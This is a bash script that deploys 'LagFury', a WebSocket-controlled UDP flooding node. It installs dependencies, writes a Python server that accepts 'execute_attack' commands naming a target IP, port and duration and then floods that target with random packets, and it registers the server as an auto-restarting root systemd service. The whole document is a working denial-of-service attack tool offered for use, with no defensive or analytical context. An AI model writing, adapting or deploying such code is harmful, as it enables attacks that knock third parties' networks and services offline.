#!/bin/bash
# LagFury Deployment - Working UDP Flooder (Port 5000, Reliable and Validated)

set -e

INSTALL_DIR="/opt/lagfury"
SERVICE_NAME="lagfury"
PY_SCRIPT="ws_server.py"

# Step 1: Environment Prep
echo "[*] Installing dependencies..."
apt update && apt install -y python3 python3-pip screen
pip3 install websockets --force-reinstall
mkdir -p "$INSTALL_DIR"
cd "$INSTALL_DIR"

# Step 2: Deploy working ws_server.py
cat > $PY_SCRIPT << 'EOF'
import asyncio
import websockets
import json
import socket
import random
import time

async def handler(websocket, path):
    async for message in websocket:
        try:
            print("[RECEIVED]", message)
            data = json.loads(message)
            if data.get("command") == "execute_attack":
                ip = data["target_ip"]
                port = int(data["target_port"])
                duration = int(data["duration"])
                if data["attack_type"] == "udp_flood":
                    end = time.time() + duration
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    while time.time() < end:
                        sock.sendto(random._urandom(1024), (ip, port))
                await websocket.send("Attack complete.")
        except Exception as e:
            await websocket.send(f"Error: {e}")

async def main():
    async with websockets.serve(handler, "0.0.0.0", 5000):
        print("[+] WebSocket server running on port 5000")
        await asyncio.Future()

asyncio.run(main())
EOF

# Step 3: Create Systemd Service
cat > /etc/systemd/system/${SERVICE_NAME}.service << EOF
[Unit]
Description=LagFury UDP Node (Port 5000)
After=network.target

[Service]
ExecStart=/usr/bin/python3 $INSTALL_DIR/$PY_SCRIPT
WorkingDirectory=$INSTALL_DIR
Restart=always
User=root

[Install]
WantedBy=multi-user.target
EOF

# Step 4: Enable & Launch
echo "[*] Enabling service..."
systemctl daemon-reexec
systemctl daemon-reload
systemctl enable $SERVICE_NAME
systemctl restart $SERVICE_NAME

echo "[+] LagFury node running on port 5000 is deployed and operational."
